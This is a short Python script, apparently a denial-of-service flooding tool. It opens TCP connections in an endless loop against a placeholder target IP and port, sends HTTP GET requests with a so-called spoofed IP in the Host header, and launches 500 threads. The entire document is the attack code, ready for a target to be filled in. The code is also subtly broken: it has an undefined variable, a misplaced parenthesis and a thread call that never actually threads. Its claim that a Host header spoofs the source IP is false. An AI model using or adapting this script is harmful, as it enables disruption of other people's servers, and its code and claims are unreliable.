## Import required libraries
import socket
import threading

## Set target
target = 'Insert target IP'
t_port = 'Insert target port'

#Spoof IP header
fakeIP = 'Insert spoof IP'

## Define connection loop
def attack():
    while True:
        # Creates a ipv4, TCP connection socket
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        # Establish connection, Get HTTP Headers
        s.connect((target, t_port))
        s.sendto("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, t.port)
        # Pass spoofed IP
        s.sendto(("Host: " + fakeIP + "\r\n\r\n").encode('ascii'), (target, t.port))
        # Close connection
        s.close()

## Define multithreading loop
for i in range(500):
    thread = threading.Thread(target=attack())
    thread.start()
